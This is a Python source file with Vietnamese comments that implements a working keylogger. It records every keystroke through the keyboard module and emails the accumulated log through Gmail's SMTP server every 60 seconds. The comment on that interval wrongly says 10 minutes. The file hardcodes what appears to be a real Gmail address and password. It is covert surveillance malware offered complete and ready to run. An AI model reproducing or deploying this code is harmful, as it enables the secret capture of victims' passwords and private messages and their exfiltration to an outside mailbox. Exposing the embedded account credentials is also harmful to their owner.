# -*- coding: utf-8 -*-
import keyboard # module dùng để lắng nghe sự kiện các phím
import smtplib # dùng để gửi email sử dụng giao thức smtp
# Semaphore dùng để block thread hiện tại, Timer dùng để đếm thời gian gửi log
from threading import Semaphore, Timer

# Khởi tạo các tham số
send_report_every = 60 # 10 phút
email_address = "vuongthaomaiphuong@gmail.com"
email_password = "vuongthaotrang"

class Keylogger:
    def __init__(self, interval):
        # Gửi log sau send_report_every tương ứng
        self.interval = interval
        # Nội dung log trong khoảng thời gian self.interval
        self.log = ""
        # Chặn luồng hiện tại khi sử dụng on_release()
        self.semaphore = Semaphore(0)

    def callback(self, event):
        # Hàm callback được gọi khi sự kiện gõ phím xảy ra
        name = event.name
        if len(name) > 1:
            # Phím đặc biệt (ctrl, alt,...)
            if name == "space":
            # "space" thay thế bằng " "
                name = " "
            elif name == "enter":
            # Xuống dòng mới khi nhấn enter
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
            # Thay thế khoảng trắng bằng gạch ngang
                name = name.replace(" ", "_")
                name = name.upper()
        self.log += name

    def sendmail(self, email, password, message):
        # Quản lý kết nối đến máy chủ SMTP
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # Kết nối đến SMTP server bằng chế độ TLS
        server.starttls()
        # Đăng nhập vào tài khoản email
        server.login(email,password)
        # Gửi log đến email
        server.sendmail(email, email, message)
        # Kết thúc phiên
        server.quit()

    def report(self):
        """ 
        Hàm report sẽ được gọi sau một khoảng thời gian 'self.interval'
        Nhiệm vụ là gửi keylogs và resets lại giá trị của 'self.log'
        """
        if self.log:
            # Nếu log có nội dung thì gửi đi
            self.sendmail(email_address, email_password, self.log)
            print(self.log)
        # resets log
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # Khởi chạy keylogger
        keyboard.on_release(callback=self.callback)
        # Khởi chạy report()
        self.report()
        # Block thread hiện tại
        self.semaphore.acquire()

if __name__ == "__main__":
    Keylogger = Keylogger(interval=send_report_every)
    Keylogger.start()

